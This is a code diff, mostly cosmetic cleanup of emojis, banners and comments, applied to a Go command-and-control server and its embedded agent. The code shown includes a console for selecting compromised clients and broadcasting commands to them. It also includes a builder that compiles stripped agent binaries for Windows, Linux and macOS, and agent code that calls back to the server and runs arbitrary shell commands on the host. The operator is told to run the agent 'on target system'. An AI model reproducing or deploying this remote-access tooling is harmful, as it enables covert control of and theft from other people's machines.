@@ -53,7 +53,7 @@ func (s *Server) startTLS() {
 	}
 	defer listener.Close()
 
-	fmt.Printf("🔒 C2 Server started on port %s (TLS Encrypted)\n", s.port)
+	fmt.Printf("C2 Server started on port %s (TLS Encrypted)\n", s.port)
 	s.startCLI()
 	s.acceptConnections(listener)
 }
@@ -65,7 +65,7 @@ func (s *Server) startInsecure() {
 	}
 	defer listener.Close()
 
-	fmt.Printf("⚠️  C2 Server started on port %s (INSECURE - No Encryption)\n", s.port)
+	fmt.Printf("C2 Server started on port %s (INSECURE - No Encryption)\n", s.port)
 	s.startCLI()
 	s.acceptConnections(listener)
 }
@@ -97,10 +97,8 @@ func (s *Server) startCLI() {
 }
 
 func (s *Server) showBanner() {
-	fmt.Println("╔══════════════════════════════════════╗")
-	fmt.Println("║           C2 Framework v1.0          ║")
-	fmt.Println("║         Command & Control            ║")
-	fmt.Println("╚══════════════════════════════════════╝")
+	fmt.Println("C2 Framework v1.0")
+	fmt.Println("Command & Control")
 	fmt.Println("Type 'help' for available commands")
 	fmt.Println()
 }
@@ -118,20 +116,20 @@ func (s *Server) handleCommand(input string) {
 		s.listClients()
 	case "select":
 		if len(parts) < 2 {
-			fmt.Println("❌ Usage: select <client_id>")
+			fmt.Println("Usage: select <client_id>")
 			return
 		}
 		s.selectClient(parts[1])
 	case "broadcast", "all":
 		if len(parts) < 2 {
-			fmt.Println("❌ Usage: broadcast <command>")
+			fmt.Println("Usage: broadcast <command>")
 			return
 		}
 		command := strings.Join(parts[1:], " ")
 		s.broadcastCommand(command)
 	case "remove", "kick":
 		if len(parts) < 2 {
-			fmt.Println("❌ Usage: remove <client_id>")
+			fmt.Println("Usage: remove <client_id>")
 			return
 		}
 		s.removeClient(parts[1])
@@ -142,15 +140,15 @@ func (s *Server) handleCommand(input string) {
 	case "clear":
 		s.clearScreen()
 	case "quit", "exit":
-		fmt.Println("👋 Shutting down C2 server...")
+		fmt.Println("Shutting down C2 server...")
 		os.Exit(0)
 	default:
-		fmt.Printf("❌ Unknown command: %s. Type 'help' for available commands.\n", parts[0])
+		fmt.Printf("Unknown command: %s. Type 'help' for available commands.\n", parts[0])
 	}
 }
 
 func (s *Server) showHelp() {
-	fmt.Println("📋 Available Commands:")
+	fmt.Println("Available Commands:")
 	fmt.Println("  help                 - Show this help menu")
 	fmt.Println("  list/clients         - List all connected clients")
 	fmt.Println("  select <client_id>   - Interactive session with client")
@@ -172,25 +170,20 @@ func (s *Server) listClients() {
 	defer s.mutex.RUnlock()
 
 	if len(s.clients) == 0 {
-		fmt.Println("📭 No clients connected")
+		fmt.Println("No clients connected")
 		return
 	}
 
-	fmt.Printf("👥 Connected Clients (%d):\n", len(s.clients))
-	fmt.Println("┌─────────────────┬──────────────┬─────────────┬──────────────┬─────────────┐")
-	fmt.Println("│ Client ID       │ OS/Arch      │ Hostname    │ User         │ Last Seen   │")
-	fmt.Println("├─────────────────┼──────────────┼─────────────┼──────────────┼─────────────┤")
-
+	fmt.Printf("Connected Clients (%d):\n", len(s.clients))
 	for id, client := range s.clients {
 		lastSeen := time.Since(client.LastSeen).Truncate(time.Second)
-		fmt.Printf("│ %-15s │ %-12s │ %-11s │ %-12s │ %-11s │\n",
+		fmt.Printf("ID: %-15s | OS/Arch: %-12s | Hostname: %-11s | User: %-12s | Last Seen: %s\n",
 			s.truncate(id, 15),
 			s.truncate(client.Info.OS+"/"+client.Info.Arch, 12),
 			s.truncate(client.Info.Hostname, 11),
 			s.truncate(client.Info.User, 12),
 			lastSeen.String())
 	}
-	fmt.Println("└─────────────────┴──────────────┴─────────────┴──────────────┴─────────────┘")
 }
 
 func (s *Server) truncate(str string, length int) string {
@@ -206,11 +199,11 @@ func (s *Server) selectClient(clientID string) {
 	s.mutex.RUnlock()
 
 	if !exists {
-		fmt.Printf("❌ Client %s not found\n", clientID)
+		fmt.Printf("Client %s not found\n", clientID)
 		return
 	}
 
-	fmt.Printf("🎯 Selected client: %s (%s)\n", clientID, client.Info.Hostname)
+	fmt.Printf("Selected client: %s (%s)\n", clientID, client.Info.Hostname)
 	fmt.Println("Type 'back' to return to main menu")
 
 	scanner := bufio.NewScanner(os.Stdin)
@@ -228,7 +221,7 @@ func (s *Server) selectClient(clientID string) {
 		}
 
 		s.sendCommand(client, command)
-		time.Sleep(100 * time.Millisecond) // Brief pause for response
+		time.Sleep(100 * time.Millisecond)
 	}
 }
 
@@ -238,11 +231,11 @@ func (s *Server) broadcastCommand(command string) {
 	s.mutex.RUnlock()
 
 	if clientCount == 0 {
-		fmt.Println("📭 No clients connected")
+		fmt.Println("No clients connected")
 		return
 	}
 
-	fmt.Printf("📢 Broadcasting to %d clients: %s\n", clientCount, command)
+	fmt.Printf("Broadcasting to %d clients: %s\n", clientCount, command)
 
 	s.mutex.RLock()
 	for _, client := range s.clients {
@@ -288,7 +281,7 @@ func (s *Server) handleClient(conn net.Conn) {
 			client = s.registerClient(conn, msg, remoteAddr)
 		case "result":
 			if client != nil {
-				fmt.Printf("\n[%s] 📤 Result:\n%s\nC2> ", client.ID, msg.Result)
+				fmt.Printf("\n[%s] Result:\n%s\nC2> ", client.ID, msg.Result)
 				client.LastSeen = time.Now()
 			}
 		case "heartbeat":
@@ -320,7 +313,7 @@ func (s *Server) registerClient(conn net.Conn, msg common.Message, remoteAddr st
 	s.clients[clientID] = client
 	s.mutex.Unlock()
 
-	fmt.Printf("\n✅ New client connected: %s (%s@%s)\nC2> ",
+	fmt.Printf("\nNew client connected: %s (%s@%s)\nC2> ",
 		clientID, info.User, info.Hostname)
 	return client
 }
@@ -337,7 +330,7 @@ func (s *Server) removeClientByID(clientID string) {
 			conn.Close()
 		}
 		delete(s.clients, clientID)
-		fmt.Printf("\n❌ Client disconnected: %s\nC2> ", clientID)
+		fmt.Printf("\nClient disconnected: %s\nC2> ", clientID)
 	}
 }
 
@@ -345,7 +338,7 @@ func (s *Server) showStatus() {
 	s.mutex.RLock()
 	defer s.mutex.RUnlock()
 
-	fmt.Printf("📊 Server Status:\n")
+	fmt.Printf("Server Status:\n")
 	fmt.Printf("  Port: %s\n", s.port)
 	fmt.Printf("  TLS: %t\n", s.useTLS)
 	fmt.Printf("  Connected Clients: %d\n", len(s.clients))
@@ -359,7 +352,7 @@ func (s *Server) clearScreen() {
 
 func (s *Server) handleGenerateCommand(args []string) {
 	if len(args) == 0 {
-		fmt.Println("❌ Usage: generate <platform> or generate custom <host> <port> <os> <output>")
+		fmt.Println("Usage: generate <platform> or generate custom <host> <port> <os> <output>")
 		fmt.Println("Platforms: windows, linux, macos")
 		return
 	}
@@ -373,63 +366,51 @@ func (s *Server) handleGenerateCommand(args []string) {
 		s.generateAgent("localhost", s.port, "darwin", "agent-macos")
 	case "custom":
 		if len(args) < 5 {
-			fmt.Println("❌ Usage: generate custom <host> <port> <os> <output>")
+			fmt.Println("Usage: generate custom <host> <port> <os> <output>")
 			fmt.Println("OS options: windows, linux, darwin")
 			return
 		}
 		s.generateAgent(args[1], args[2], args[3], args[4])
 	default:
-		fmt.Println("❌ Unknown platform. Use: windows, linux, macos, or custom")
+		fmt.Println("Unknown platform. Use: windows, linux, macos, or custom")
 	}
 }
 
 func (s *Server) generateAgent(host, port, targetOS, output string) {
-	fmt.Printf("🔨 Generating agent for %s...\n", targetOS)
+	fmt.Printf("Generating agent for %s...\n", targetOS)
 
-	// Create agent source code with embedded config
 	agentSource := s.createAgentSource(host, port)
-
-	// Write temporary source file
 	tempFile := "temp_agent.go"
 	if err := os.WriteFile(tempFile, []byte(agentSource), 0644); err != nil {
-		fmt.Printf("❌ Failed to create temp source: %v\n", err)
+		fmt.Printf("Failed to create temp source: %v\n", err)
 		return
 	}
 	defer os.Remove(tempFile)
 
-	// Build the agent
 	var cmd *exec.Cmd
 	env := os.Environ()
-	env = append(env, fmt.Sprintf("GOOS=%s", targetOS))
-
-	if targetOS == "windows" {
-		env = append(env, "GOARCH=amd64")
-		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", output, tempFile)
-	} else {
-		env = append(env, "GOARCH=amd64")
-		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", output, tempFile)
-	}
+	env = append(env, fmt.Sprintf("GOOS=%s", targetOS), "GOARCH=amd64")
+	cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", output, tempFile)
 
 	cmd.Env = env
 	cmd.Dir = "."
 
 	if output, err := cmd.CombinedOutput(); err != nil {
-		fmt.Printf("❌ Build failed: %v\n%s\n", err, string(output))
+		fmt.Printf("Build failed: %v\n%s\n", err, string(output))
 		return
 	}
 
-	// Get file info
 	info, err := os.Stat(output)
 	if err != nil {
-		fmt.Printf("❌ Failed to get file info: %v\n", err)
+		fmt.Printf("Failed to get file info: %v\n", err)
 		return
 	}
 
-	fmt.Printf("✅ Agent generated successfully!\n")
-	fmt.Printf("📁 File: %s\n", output)
-	fmt.Printf("📊 Size: %.2f KB\n", float64(info.Size())/1024)
-	fmt.Printf("🎯 Target: %s:%s (%s)\n", host, port, targetOS)
-	fmt.Printf("💡 Usage: ./%s (on target system)\n", output)
+	fmt.Printf("Agent generated successfully!\n")
+	fmt.Printf("File: %s\n", output)
+	fmt.Printf("Size: %.2f KB\n", float64(info.Size())/1024)
+	fmt.Printf("Target: %s:%s (%s)\n", host, port, targetOS)
+	fmt.Printf("Usage: ./%s (on target system)\n", output)
 }
 
 func (s *Server) createAgentSource(host, port string) string {
@@ -490,12 +471,10 @@ func connectToServer(clientID string) error {
 	var conn net.Conn
 	var err error
 	
-	// Try TLS first
 	conn, err = tls.Dial("tcp", SERVER_HOST+":"+SERVER_PORT, &tls.Config{
 		InsecureSkipVerify: true,
 	})
 	if err != nil {
-		// Fallback to insecure
 		conn, err = net.Dial("tcp", SERVER_HOST+":"+SERVER_PORT)
 		if err != nil {
 			return err
@@ -503,15 +482,12 @@ func connectToServer(clientID string) error {
 	}
 	defer conn.Close()
 	
-	// Register with server
 	if err := register(conn, clientID); err != nil {
 		return err
 	}
 	
-	// Start heartbeat
 	go heartbeat(conn, clientID)
 	
-	// Handle commands
 	return handleCommands(conn, clientID)
 }
 
@@ -578,7 +554,7 @@ func handleCommands(conn net.Conn, clientID string) error {
 func executeCommand(command string) string {
 	parts := strings.Fields(command)
 	if len(parts) == 0 {
-		return "❌ Empty command"
+		return "Empty command"
 	}
 	
 	switch parts[0] {
@@ -587,15 +563,15 @@ func executeCommand(command string) string {
 	case "pwd":
 		dir, err := os.Getwd()
 		if err != nil {
-			return fmt.Sprintf("❌ Error: %%v", err)
+			return fmt.Sprintf("Error: %%v", err)
 		}
-		return fmt.Sprintf("📁 Current directory: %%s", dir)
+		return fmt.Sprintf("Current directory: %%s", dir)
 	case "whoami":
 		user := os.Getenv("USER")
 		if user == "" {
 			user = os.Getenv("USERNAME")
 		}
-		return fmt.Sprintf("👤 Current user: %%s", user)
+		return fmt.Sprintf("Current user: %%s", user)
 	default:
 		return executeSystemCommand(command)
 	}
@@ -608,7 +584,7 @@ func getSystemInfo() string {
 		user = os.Getenv("USERNAME")
 	}
 	
-	return fmt.Sprintf("💻 System Information:\nOS: %%s\nArch: %%s\nHostname: %%s\nUser: %%s\nGo: %%s",
+	return fmt.Sprintf("System Information:\nOS: %%s\nArch: %%s\nHostname: %%s\nUser: %%s\nGo: %%s",
 		runtime.GOOS, runtime.GOARCH, hostname, user, runtime.Version())
 }
 
@@ -624,7 +600,7 @@ func executeSystemCommand(command string) string {
 	
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		return fmt.Sprintf("❌ Error: %%v\nOutput: %%s", err, string(output))
+		return fmt.Sprintf("Error: %%v\nOutput: %%s", err, string(output))
 	}
 	return string(output)
 }
